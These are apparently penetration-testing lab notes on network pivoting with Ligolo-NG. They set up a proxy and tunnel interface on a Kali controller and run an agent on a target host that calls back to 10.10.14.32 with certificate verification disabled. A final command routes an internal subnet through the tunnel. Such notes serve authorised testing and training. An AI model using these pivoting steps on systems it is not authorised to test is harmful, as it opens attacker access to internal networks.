## 🌐 Ligolo-NG Proxy Configuration

The Ligolo-NG utility facilitates L3 VPN pivoting. This sequence establishes the proxy server on the controller machine.

```bash
# Initialize TUN interface, set operational status, and launch proxy with self-signed certificate
sudo ip tuntap add user monchat mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```
* Tool: Ligolo-NG Proxy

---

## 🛰️ Agent Deployment

Execute the following command on the target machine to establish the connection to the listening proxy.

```bash
# Connect agent to controller listener; ignore SSL/TLS verification
./agent -connect 10.10.14.32:11601 -ignore-cert
```
* Tool: Ligolo-NG Agent

---

## 🔀 Routing Configuration

Configure the local routing table on the Kali controller to route traffic destined for the internal subnet through the newly created tunnel interface.

```bash
# Add route to target subnet via the ligolo tunnel interface
sudo ip route add 172.16.1.0/24 dev ligolo
```
* Tool: IP Route
